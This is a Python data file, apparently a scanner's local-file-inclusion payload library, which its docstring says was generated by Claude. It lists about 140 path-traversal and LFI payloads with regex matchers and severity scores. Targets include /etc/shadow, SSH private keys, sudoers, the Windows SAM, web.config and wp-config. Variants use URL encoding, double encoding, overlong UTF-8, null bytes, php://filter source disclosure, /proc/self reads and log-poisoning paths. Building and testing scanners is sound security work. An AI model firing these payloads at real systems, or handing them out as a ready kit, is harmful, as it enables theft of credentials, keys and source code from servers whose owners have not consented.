"""lfi payload library — generated dev-time by Claude.

Regenerate via tools/_gen/gen_payloads.py lfi. Zero runtime cost.
"""

LFI_PAYLOADS = [
  {
    "payload": "../../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../../../../../etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "/etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "....//....//etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "....////....////etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..//////etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../etc/passwd%00",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/shadow",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../etc/shadow",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../../etc/group",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:x:0",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/hosts",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "127\\.0\\.0\\.1.*localhost",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/hostname",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "[a-zA-Z0-9\\-]+",
    "severity": "low",
    "cvss": 3.7
  },
  {
    "payload": "../../../../etc/issue",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "Ubuntu|Debian|CentOS|Red Hat",
    "severity": "low",
    "cvss": 3.7
  },
  {
    "payload": "../../../../etc/os-release",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "NAME=|VERSION=",
    "severity": "low",
    "cvss": 3.7
  },
  {
    "payload": "../../../../etc/crontab",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "SHELL=|PATH=|cron",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/ssh/sshd_config",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "Port |PermitRootLogin",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../root/.bash_history",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "bash|sudo|ls|cat",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../home/user/.ssh/id_rsa",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "BEGIN.*PRIVATE KEY",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../var/mail/root",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "From:|Subject:|Date:",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/mysql/my.cnf",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "\\[mysqld\\]|user=|password=",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/apache2/apache2.conf",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "ServerRoot|DocumentRoot",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/nginx/nginx.conf",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "worker_processes|server_name",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../usr/local/etc/php/php.ini",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "allow_url_include|disable_functions",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/php.ini",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "allow_url_include|disable_functions",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/passwd%0a",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd~",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd.bak",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../var/log/auth.log",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "sshd|sudo|PAM",
    "severity": "medium",
    "cvss": 6.5
  },
  {
    "payload": "..\\..\\..\\..\\windows\\win.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/win.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..\\..\\..\\windows\\win.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/system32/drivers/etc/hosts",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "127\\.0\\.0\\.1.*localhost",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "127\\.0\\.0\\.1.*localhost",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../boot.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[boot loader\\]|\\[operating systems\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..\\..\\..\\..\\boot.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[boot loader\\]|\\[operating systems\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/system.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[386enh\\]|\\[drivers\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..\\..\\..\\..\\windows\\system.ini",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "\\[386enh\\]|\\[drivers\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/repair/sam",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "SAM|SYSTEM",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "..\\..\\..\\..\\windows\\repair\\sam",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "SAM|SYSTEM",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../inetpub/wwwroot/web.config",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "<configuration>|connectionString",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "<configuration>|connectionString",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../../windows/system32/config/system",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "SYSTEM|CurrentControlSet",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "..\\..\\..\\..\\Users\\Administrator\\NTUSER.DAT",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "NTUSER|regedit",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/debug/NetSetup.log",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "NetSetup|Domain|Status",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "..\\..\\..\\..\\windows\\debug\\NetSetup.log",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "NetSetup|Domain|Status",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=convert.base64-encode/resource=config.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=string.rot13/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "<?cuc|<?php",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=../config.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "target_os": "linux",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=convert.iconv.UTF-8.UTF-16/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "php|HTML|script",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=database.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "php://filter/read=convert.base64-encode/resource=admin.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://input",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "php|executed|eval",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=wp-config.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "php://filter/read=convert.base64-encode/resource=../../../wp-config.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
    "target_os": "linux",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=string.toupper/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "<?PHP|HTML|SCRIPT",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "php://filter/read=string.tolower|convert.base64-encode/resource=index.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=login.php",
    "target_os": "any",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "/proc/self/environ",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "HTTP_USER_AGENT|HOME=|PATH=",
    "severity": "high",
    "cvss": 8.1
  },
  {
    "payload": "../../../../proc/self/environ",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "HTTP_USER_AGENT|HOME=|PATH=",
    "severity": "high",
    "cvss": 8.1
  },
  {
    "payload": "/proc/self/cmdline",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "php|apache|nginx|python",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../proc/self/cmdline",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "php|apache|nginx|python",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "/proc/self/fd/0",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": ".*",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../proc/self/fd/1",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": ".*",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "/proc/self/maps",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "r-xp|rwxp|heap|stack",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../proc/self/maps",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "r-xp|rwxp|heap|stack",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "/proc/self/status",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "Name:|Pid:|Uid:",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../proc/self/cwd",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "var|www|html|srv",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%2f..%2f..%2f..%2fwindows%2fwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "..%252f..%252f..%252fetc%252fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%u2215..%u2215etc%u2215passwd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%u002f..%u002f..%u002fetc%u002fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%5c..%5c..%5c..%5cetc%5cpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2fetc%2fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2fetc%2fshadow",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "HTTP_USER_AGENT|HOME=",
    "severity": "high",
    "cvss": 8.1
  },
  {
    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%2F..%2F..%2F..%2Fboot.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[boot loader\\]|\\[operating systems\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%255c..%255c..%255cwindows%255cwin.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%255c..%255c..%255c..%255cboot.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[boot loader\\]|\\[operating systems\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%25252f..%25252f..%25252fetc%25252fpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252fetc%252fhosts",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "127\\.0\\.0\\.1.*localhost",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "..%255c..%255c..%255c..%255cinetpub%255cwwwroot%255cweb.config",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "<configuration>|connectionString",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc%252fself%252fenviron",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "HTTP_USER_AGENT|HOME=",
    "severity": "high",
    "cvss": 8.1
  },
  {
    "payload": "..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "127\\.0\\.0\\.1.*localhost",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "%252e%252e%252f%252e%252e%252fwindows%252fwin.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%25252e%25252e%25252f%25252e%25252e%25252fwindows%25252fwin.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd%00",
    "target_os": "linux",
    "category": "null-byte",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd%00.jpg",
    "target_os": "linux",
    "category": "null-byte",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd\u0000.php",
    "target_os": "linux",
    "category": "null-byte",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../windows/win.ini%00.jpg",
    "target_os": "windows",
    "category": "null-byte",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/shadow%00.html",
    "target_os": "linux",
    "category": "null-byte",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../../var/log/apache2/access.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "GET|POST|HTTP/1\\.[01]",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../var/log/apache/access.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "GET|POST|HTTP/1\\.[01]",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../var/log/nginx/access.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "GET|POST|HTTP/1\\.[01]",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../var/log/vsftpd.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "ftp|USER|PASS|230|530",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "../../../../var/log/mail.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "postfix|sendmail|SMTP",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../etc/passwd%20",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..//////etc/shadow",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "....\\\\....\\\\etc\\\\passwd",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../.%2e/..%2f..%2fetc/passwd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": ".%2e/.%2e/.%2e/.%2e/etc/passwd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": ".%2e%2f.%2e%2f.%2e%2fetc%2fpasswd",
    "target_os": "linux",
    "category": "encoded-bypass",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
    "target_os": "windows",
    "category": "encoded-bypass",
    "matcher": "\\[fonts\\]|\\[extensions\\]",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
    "target_os": "linux",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "php://filter/convert.base64-encode/resource=../../../windows/win.ini",
    "target_os": "windows",
    "category": "php-filter",
    "matcher": "^[A-Za-z0-9+/=]{20,}",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "../../../../proc/version",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "Linux version|gcc",
    "severity": "low",
    "cvss": 3.7
  },
  {
    "payload": "../../../../proc/net/fib_trie",
    "target_os": "linux",
    "category": "proc-self",
    "matcher": "LOCAL|HOST|\\d+\\.\\d+\\.\\d+\\.\\d+",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "../../../../etc/sudoers",
    "target_os": "linux",
    "category": "linux-passwd",
    "matcher": "root.*ALL.*ALL|%sudo",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../../etc/passwd%2500",
    "target_os": "linux",
    "category": "null-byte",
    "matcher": "root:.*:0:0",
    "severity": "high",
    "cvss": 7.5
  },
  {
    "payload": "..%252f..%252f..%252f..%252fetc%252fshadow",
    "target_os": "linux",
    "category": "double-encoded",
    "matcher": "root:\\$[0-9a-z]\\$",
    "severity": "critical",
    "cvss": 9.1
  },
  {
    "payload": "../../../../var/log/apache2/error.log",
    "target_os": "linux",
    "category": "log-poison",
    "matcher": "PHP|error|Warning|Notice",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "..\\..\\..\\..\\windows\\system32\\config\\SAM",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "SAM|SYSTEM|HKLM",
    "severity": "critical",
    "cvss": 9.8
  },
  {
    "payload": "..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log",
    "target_os": "windows",
    "category": "windows-ini",
    "matcher": "GET|POST|W3SVC",
    "severity": "medium",
    "cvss": 5.3
  },
  {
    "payload": "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255csystem.ini",
    "target_os": "windows",
    "category": "double-encoded",
    "matcher": "\\[386enh\\]|\\[drivers\\]",
    "severity": "high",
    "cvss": 7.5
  }
]
